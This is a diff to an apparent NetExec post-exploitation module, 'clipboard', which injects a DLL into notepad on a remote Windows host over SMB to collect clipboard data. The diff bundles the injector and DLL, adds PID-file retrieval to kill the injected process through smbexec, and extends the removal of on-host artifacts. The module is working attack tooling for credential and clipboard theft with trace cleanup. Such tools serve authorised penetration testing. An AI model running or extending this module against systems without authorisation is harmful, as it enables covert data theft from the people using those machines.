@@ -1,32 +1,34 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 
 import os
 import time
-import re
 import sys
+import tempfile
+
+from nxc.helpers.misc import CATEGORY
+from nxc.paths import get_ps_script
+
 
 class NXCModule:
-    name = 'clipboard'
+    name = "clipboard"
     description = "Inject DLL into notepad to collect clipboard data"
-    supported_protocols = ['smb']
+    supported_protocols = ["smb"]
     opsec_safe = False
     multiple_hosts = False
+    category = CATEGORY.CREDENTIAL_DUMPING
 
     def options(self, context, module_options):
-        '''
-        BINARY          DLL injector binary
-        DLL             DLL to inject
+        """
         TIME            Monitoring clipboard time (sec)
 
         Example:
-        nxc smb <ip> -u <user> -p <password> -M clipboard -o BINARY=injector.exe DLL=payload.dll TIME=30
-        '''
+        nxc smb <ip> -u <user> -p <password> -M clipboard -o TIME=30
+        """
         self.share = "C$"
         self.tmp_dir = "C:\\Windows\\Temp\\"
         self.tmp_share = self.tmp_dir.split(":")[1]
-        self.binary = module_options.get("BINARY")
-        self.dll = module_options.get("DLL")
+        self.binary = get_ps_script("clipboard/dfuse.exe")
+        self.dll = get_ps_script("clipboard/dllwin2.dll")
         self.time = module_options.get("TIME")
 
     def on_login(self, context, connection):
@@ -36,12 +38,6 @@ class NXCModule:
         self.logger = context.log
         self.connection = connection
 
-        if not self.binary or not os.path.isfile(self.binary):
-            self.logger.fail("Invalid or missing BINARY path")
-            return 1
-        if not self.dll or not os.path.isfile(self.dll):
-            self.logger.fail("Invalid or missing DLL path")
-            return 1
         if not self.time:
             self.logger.fail("Time not specified")
             return 1
@@ -83,9 +79,24 @@ class NXCModule:
             context.log.info("Monitoring period ended.")
 
             kill_cmd = "taskkill /F /IM notepad.exe >nul 2>&1"
-            context.log.display("Killing notepad if it exists...")
+            context.log.display("Terminating injected process...")
             try:
+                with tempfile.NamedTemporaryFile(delete=False) as pid_file:
+                    connection.conn.getFile(
+                        self.share,
+                        f"{self.tmp_share}.nxc_clipboard.pid",
+                        pid_file.write
+                    )
+                    pid_file.flush()
+                    with open(pid_file.name) as f:
+                        pid = f.read().strip()
+                    os.remove(pid_file.name)
+
+                context.log.info(f"Target PID: {pid}")
+
+                kill_cmd = f"taskkill /F /PID {pid} >nul 2>&1"
                 connection.execute(kill_cmd, False, methods=["smbexec"])
+                context.log.success(f"Terminated injected process (PID {pid})")
             except Exception as e:
                 context.log.warn(f"Could not kill notepad: {e}")
 
@@ -123,7 +134,7 @@ class NXCModule:
             except Exception as e:
                 self.logger.fail(f"Could not delete local Thumbs.db: {e}")
 
-            artifacts = [self.log_name, self.log_tool_name, self.binary_name, self.dll_name]
+            artifacts = [self.log_name, self.log_tool_name, self.binary_name, self.dll_name, ".nxc_clipboard.pid"]
             deleted = []
             for artifact in set(artifacts):
                 result = self.remove_artifact(artifact)
